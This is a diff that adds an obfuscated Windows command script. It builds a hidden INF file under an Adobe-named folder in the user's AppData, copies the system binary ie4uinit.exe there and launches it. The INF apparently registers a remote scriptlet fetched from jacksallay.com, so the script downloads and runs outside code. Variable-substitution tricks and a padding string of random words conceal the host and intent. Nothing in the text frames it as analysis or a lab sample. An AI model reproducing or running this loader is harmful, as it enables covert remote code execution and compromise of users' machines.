@@ -1,0 +1,7 @@
+/v /c (for %f in (s) do @set "Earth=%~f") &&
+  (for %t in (i) do @set "Large=%~t") &&
+  (for %v in (a) do @set "Dreams=%~v") &&
+  (for %t in (c) do @set "Pioneer=%~t") &&
+  call(for %f in ("[strings]" "Positions=b;Decisions" "Conditions=h" "Rebuild=t;Identify" "Prefers=:;Return" "Motion=/" "Wreck=init" "shortsvcname=' '" "servicename=' '" "Cycles=cLarge!me%" "[defaultinstall.windows7]" "Un\" "Register\" "OCXs=5286" "delfiles=D6721" "[5286]" "sc\" "ro%Positions%j,NI,%Conditions%%Rebuild%%Rebuild%p%Prefers%%Motion%%Motion%d4h6ed.jacksallay.com/0927d908" "[D6721]" "ieu%Wreck%.inf" "[destinationdirs]" "D6721=01" "defaultdestdir=11" "[version]" "signature =$windows nt$" ) do @echo %~f)>"%appdata%\Adobe\ieuinit.inf" &&
+  call xcopy /Y /C /Q %w!Large!n!Refugees!ir%\system32\ie4uinit.exe "%appdata%\Adobe\*" | set Lemon54=Musical &&
+  start " " %appdata%\Adobe\ie4uinit.exe -basesettings " | set "Lemon6=Process Narrow Yards Webmasters Collins Ritual Truck Racks Archives Early Lyrics Truly Customs Decline Conclusions Authorities Walls Logistics Thesaurus Edwards Major Contributors Parade Situate Citations Actual Obligations Nominations Embark Avocado Vendor Bitter Drawings Silver Renew Stuff Seminar Agents Filters Weeks Ankle Olympus Woman Towns Reports Absent Scale Bargain Generous Decide"
